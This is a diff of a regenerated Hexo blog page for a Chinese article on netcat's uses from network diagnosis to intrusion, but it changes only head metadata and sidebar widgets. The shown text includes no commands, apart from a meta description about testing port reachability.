@@ -1,44 +1,46 @@
 <!DOCTYPE html>
 <html lang=zh>
-<head><meta name="generator" content="Hexo 3.9.0">
+<head>
   <meta charset="utf-8">
   
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
   <meta name="renderer" content="webkit">
-  <meta http-equiv="Cache-Control" content="no-transform">
-  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black">
   <meta name="format-detection" content="telephone=no,email=no,adress=no">
   <!-- Color theme for statusbar -->
-  <meta name="theme-color" content="#000000">
+  <meta name="theme-color" content="#000000" />
   <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
-  <meta http-equiv="window-target" content="_top">
+  <meta http-equiv="window-target" content="_top" />
   
   
   <title>扫盲 netcat（网猫）的 N 种用法——从网络诊断”到“系统入侵 | 郑建勋的个人网站</title>
   <meta name="description" content="★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达 ◇使用场景 经常有这种需求，要判断某个主机的监听端口是否能连上。 　　导致监听端口【无法】，通常有两种原因： 其一，这个监听端口根本就【没开启】； 其二，监听端口虽然开启，但是被防火墙阻拦了。 　　对第1个原因，（如果你能在该主机上运行命令）可以直接用 netstat 这个命令查看监听端口是否开启（不懂 netstat 命令的同学，可">
-<meta name="keywords" content="go">
 <meta property="og:type" content="article">
 <meta property="og:title" content="扫盲 netcat（网猫）的 N 种用法——从网络诊断”到“系统入侵">
-<meta property="og:url" content="https://dreamerjonson.com/2019/11/14/扫盲-netcat（网猫）的-N-种用法——从网络诊断”到“系统入侵/index.html">
+<meta property="og:url" content="https://dreamerjonson.com/2019/11/14/%E6%89%AB%E7%9B%B2-netcat%EF%BC%88%E7%BD%91%E7%8C%AB%EF%BC%89%E7%9A%84-N-%E7%A7%8D%E7%94%A8%E6%B3%95%E2%80%94%E2%80%94%E4%BB%8E%E7%BD%91%E7%BB%9C%E8%AF%8A%E6%96%AD%E2%80%9D%E5%88%B0%E2%80%9C%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5/index.html">
 <meta property="og:site_name" content="Jonson">
 <meta property="og:description" content="★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达 ◇使用场景 经常有这种需求，要判断某个主机的监听端口是否能连上。 　　导致监听端口【无法】，通常有两种原因： 其一，这个监听端口根本就【没开启】； 其二，监听端口虽然开启，但是被防火墙阻拦了。 　　对第1个原因，（如果你能在该主机上运行命令）可以直接用 netstat 这个命令查看监听端口是否开启（不懂 netstat 命令的同学，可">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-11-29T13:11:27.698Z">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-11-14T15:49:56.000Z">
+<meta property="article:modified_time" content="2019-11-29T13:11:27.698Z">
+<meta property="article:author" content="Jonson">
+<meta property="article:tag" content="go">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="扫盲 netcat（网猫）的 N 种用法——从网络诊断”到“系统入侵">
-<meta name="twitter:description" content="★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达 ◇使用场景 经常有这种需求，要判断某个主机的监听端口是否能连上。 　　导致监听端口【无法】，通常有两种原因： 其一，这个监听端口根本就【没开启】； 其二，监听端口虽然开启，但是被防火墙阻拦了。 　　对第1个原因，（如果你能在该主机上运行命令）可以直接用 netstat 这个命令查看监听端口是否开启（不懂 netstat 命令的同学，可">
   <!-- Canonical links -->
-  <link rel="canonical" href="https://dreamerjonson.com/2019/11/14/扫盲-netcat（网猫）的-N-种用法——从网络诊断”到“系统入侵/index.html">
+  <link rel="canonical" href="https://dreamerjonson.com/2019/11/14/%E6%89%AB%E7%9B%B2-netcat%EF%BC%88%E7%BD%91%E7%8C%AB%EF%BC%89%E7%9A%84-N-%E7%A7%8D%E7%94%A8%E6%B3%95%E2%80%94%E2%80%94%E4%BB%8E%E7%BD%91%E7%BB%9C%E8%AF%8A%E6%96%AD%E2%80%9D%E5%88%B0%E2%80%9C%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Jonson" type="application/atom+xml">
   
   
     <link rel="icon" href="/favicon.png" type="image/x-icon">
   
-  <link rel="stylesheet" href="/css/style.css">
+  
+<link rel="stylesheet" href="/css/style.css">
+
   
   
   
@@ -49,7 +51,7 @@
 
 
 
-</head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 
 <body class="main-center" itemscope itemtype="http://schema.org/WebPage">
@@ -171,8 +173,8 @@
               <div  class="content">
                   <!-- <p>I've learned that people will forget what you said, people will forget what you did, but people will never forget how you made them feel.</p> -->
                   <!--  -->
-                  <!-- 能够改变未来的权利，每个人都是平等的。&lt;br/&gt;&lt;p align=&#34;right&#34;&gt;--黑帮 贝吉&lt;/p&gt; -->
-                    <!-- 能够改变未来的权利，每个人都是平等的。<br/><p align="right">--黑帮 贝吉</p> -->
+                  <!-- 所谓的弱，就是一种罪，所谓理想，只是拥有实力的人才能说的“现实”。 &lt;br/&gt;&lt;p align=&#34;right&#34;&gt;--克罗克达尔&lt;/p&gt; -->
+                    <!-- 所谓的弱，就是一种罪，所谓理想，只是拥有实力的人才能说的“现实”。 <br/><p align="right">--克罗克达尔</p> -->
                 公众号：唯识相链，来关注我吧~<br/>
                 <div><img src="/images/xingqiu-qrcode.jpg" width="150" height="150"></div>
                 go语言交流2群：713385260<br/>
@@ -186,7 +188,7 @@
   <div class="widget">
     <h3 class="widget-title">分类</h3>
     <div class="widget-body">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/DAPP/">DAPP</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/bootstrap/">bootstrap</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/emacs/">emacs</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/git/mac环境配置/">mac环境配置</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/go/">go</a><span class="category-list-count">162</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/go/数据结构/">数据结构</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/go-数据结构/">go 数据结构</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hexo/">hexo</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/js/">js</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/kali/">kali</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/kali-linux/">kali-linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/mac/">mac</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/macOS/">macOS</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/network/">network</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/nodejs/">nodejs</a><span class="category-list-count">32</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/server/">server</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/unix/">unix</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/前端/">前端</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/区块链/">区块链</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/区块链原理/">区块链原理</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发配置/">开发配置</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/智能合约-solidity语法/">智能合约 solidity语法</a><span class="category-list-count">60</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/置顶/">置顶</a><span class="category-list-count">1</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/DAPP/">DAPP</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/bootstrap/">bootstrap</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/emacs/">emacs</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/git/mac%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">mac环境配置</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/go/">go</a><span class="category-list-count">163</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/go/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/go-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">go 数据结构</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hexo/">hexo</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/js/">js</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/kali/">kali</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/kali-linux/">kali-linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/mac/">mac</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/macOS/">macOS</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/network/">network</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/nodejs/">nodejs</a><span class="category-list-count">32</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/server/">server</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/unix/">unix</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86/">区块链原理</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E9%85%8D%E7%BD%AE/">开发配置</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-solidity%E8%AF%AD%E6%B3%95/">智能合约 solidity语法</a><span class="category-list-count">60</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%AE%E9%A1%B6/">置顶</a><span class="category-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -196,7 +198,7 @@
   <div class="widget">
     <h3 class="widget-title">标签</h3>
     <div class="widget-body">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/bootstrap/">bootstrap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/css/">css</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/emacs/">emacs</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/go/">go</a><span class="tag-list-count">162</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/go-数据结构/">go 数据结构</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/">js</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali/">kali</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali-linux/">kali-linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mac/">mac</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/macOS/">macOS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mac环境配置/">mac环境配置</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/network/">network</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nodejs/">nodejs</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nodejs-前端/">nodejs 前端</a><span class="tag-list-count">32</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/server/">server</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/solidity/">solidity</a><span class="tag-list-count">64</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unix/">unix</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/以太坊/">以太坊</a><span class="tag-list-count">64</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端/">前端</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/区块链/">区块链</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/区块链原理/">区块链原理</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/开发配置/">开发配置</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据结构/">数据结构</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/智能合约/">智能合约</a><span class="tag-list-count">64</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/置顶/">置顶</a><span class="tag-list-count">1</span></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/bootstrap/" rel="tag">bootstrap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/css/" rel="tag">css</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/emacs/" rel="tag">emacs</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/" rel="tag">git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/go/" rel="tag">go</a><span class="tag-list-count">163</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/go-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="tag">go 数据结构</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/" rel="tag">js</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali/" rel="tag">kali</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali-linux/" rel="tag">kali-linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mac/" rel="tag">mac</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/macOS/" rel="tag">macOS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mac%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" rel="tag">mac环境配置</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/network/" rel="tag">network</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nodejs-%E5%89%8D%E7%AB%AF/" rel="tag">nodejs 前端</a><span class="tag-list-count">32</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/server/" rel="tag">server</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/solidity/" rel="tag">solidity</a><span class="tag-list-count">64</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/unix/" rel="tag">unix</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/" rel="tag">以太坊</a><span class="tag-list-count">64</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF/" rel="tag">前端</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86/" rel="tag">区块链原理</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BC%80%E5%8F%91%E9%85%8D%E7%BD%AE/" rel="tag">开发配置</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="tag">数据结构</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" rel="tag">智能合约</a><span class="tag-list-count">64</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%AE%E9%A1%B6/" rel="tag">置顶</a><span class="tag-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -206,7 +208,7 @@
   <div class="widget">
     <h3 class="widget-title">标签云</h3>
     <div class="widget-body tagcloud">
-      <a href="/tags/bootstrap/" style="font-size: 13px;">bootstrap</a> <a href="/tags/css/" style="font-size: 13px;">css</a> <a href="/tags/docker/" style="font-size: 13.38px;">docker</a> <a href="/tags/emacs/" style="font-size: 13px;">emacs</a> <a href="/tags/git/" style="font-size: 13px;">git</a> <a href="/tags/go/" style="font-size: 14px;">go</a> <a href="/tags/go-数据结构/" style="font-size: 13.13px;">go 数据结构</a> <a href="/tags/hexo/" style="font-size: 13px;">hexo</a> <a href="/tags/js/" style="font-size: 13.13px;">js</a> <a href="/tags/kali/" style="font-size: 13px;">kali</a> <a href="/tags/kali-linux/" style="font-size: 13px;">kali-linux</a> <a href="/tags/linux/" style="font-size: 13.13px;">linux</a> <a href="/tags/mac/" style="font-size: 13.25px;">mac</a> <a href="/tags/macOS/" style="font-size: 13px;">macOS</a> <a href="/tags/mac环境配置/" style="font-size: 13.13px;">mac环境配置</a> <a href="/tags/network/" style="font-size: 13px;">network</a> <a href="/tags/nodejs/" style="font-size: 13.63px;">nodejs</a> <a href="/tags/nodejs-前端/" style="font-size: 13.75px;">nodejs 前端</a> <a href="/tags/python/" style="font-size: 13px;">python</a> <a href="/tags/server/" style="font-size: 13.25px;">server</a> <a href="/tags/solidity/" style="font-size: 13.88px;">solidity</a> <a href="/tags/unix/" style="font-size: 13.13px;">unix</a> <a href="/tags/以太坊/" style="font-size: 13.88px;">以太坊</a> <a href="/tags/前端/" style="font-size: 13.38px;">前端</a> <a href="/tags/区块链/" style="font-size: 13px;">区块链</a> <a href="/tags/区块链原理/" style="font-size: 13.5px;">区块链原理</a> <a href="/tags/开发配置/" style="font-size: 13px;">开发配置</a> <a href="/tags/数据结构/" style="font-size: 13px;">数据结构</a> <a href="/tags/智能合约/" style="font-size: 13.88px;">智能合约</a> <a href="/tags/置顶/" style="font-size: 13px;">置顶</a>
+      <a href="/tags/bootstrap/" style="font-size: 13px;">bootstrap</a> <a href="/tags/css/" style="font-size: 13px;">css</a> <a href="/tags/docker/" style="font-size: 13.38px;">docker</a> <a href="/tags/emacs/" style="font-size: 13px;">emacs</a> <a href="/tags/git/" style="font-size: 13px;">git</a> <a href="/tags/go/" style="font-size: 14px;">go</a> <a href="/tags/go-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 13.13px;">go 数据结构</a> <a href="/tags/hexo/" style="font-size: 13px;">hexo</a> <a href="/tags/js/" style="font-size: 13.13px;">js</a> <a href="/tags/kali/" style="font-size: 13px;">kali</a> <a href="/tags/kali-linux/" style="font-size: 13px;">kali-linux</a> <a href="/tags/linux/" style="font-size: 13.13px;">linux</a> <a href="/tags/mac/" style="font-size: 13.25px;">mac</a> <a href="/tags/macOS/" style="font-size: 13px;">macOS</a> <a href="/tags/mac%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" style="font-size: 13.13px;">mac环境配置</a> <a href="/tags/network/" style="font-size: 13px;">network</a> <a href="/tags/nodejs/" style="font-size: 13.63px;">nodejs</a> <a href="/tags/nodejs-%E5%89%8D%E7%AB%AF/" style="font-size: 13.75px;">nodejs 前端</a> <a href="/tags/python/" style="font-size: 13px;">python</a> <a href="/tags/server/" style="font-size: 13.25px;">server</a> <a href="/tags/solidity/" style="font-size: 13.88px;">solidity</a> <a href="/tags/unix/" style="font-size: 13.13px;">unix</a> <a href="/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/" style="font-size: 13.88px;">以太坊</a> <a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 13.38px;">前端</a> <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" style="font-size: 13px;">区块链</a> <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86/" style="font-size: 13.5px;">区块链原理</a> <a href="/tags/%E5%BC%80%E5%8F%91%E9%85%8D%E7%BD%AE/" style="font-size: 13px;">开发配置</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 13px;">数据结构</a> <a href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" style="font-size: 13.88px;">智能合约</a> <a href="/tags/%E7%BD%AE%E9%A1%B6/" style="font-size: 13px;">置顶</a>
     </div>
   </div>
 
@@ -215,7 +217,7 @@
   <div class="widget">
     <h3 class="widget-title">归档</h3>
     <div class="widget-body">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">17</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a><span class="archive-list-count">33</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">44</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">119</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">七月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a><span class="archive-list-count">2</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">17</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a><span class="archive-list-count">33</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">44</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">119</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">七月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a><span class="archive-list-count">2</span></li></ul>
     </div>
   </div>
 
@@ -227,6 +229,21 @@
     <div class="widget-body">
       <ul class="recent-post-list list-unstyled no-thumbnail">
         
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/go/">go</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/07/02/kafka-golang/" class="title">实战Kafka—术语</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-07-02T06:50:37.000Z" itemprop="datePublished">2020-07-02</time>
+              </p>
+            </div>
+          </li>
+          
           <li>
             
             <div class="item-inner">
@@ -287,21 +304,6 @@
             </div>
           </li>
           
-          <li>
-            
-            <div class="item-inner">
-              <p class="item-category">
-                <a class="category-link" href="/categories/go/">go</a>
-              </p>
-              <p class="item-title">
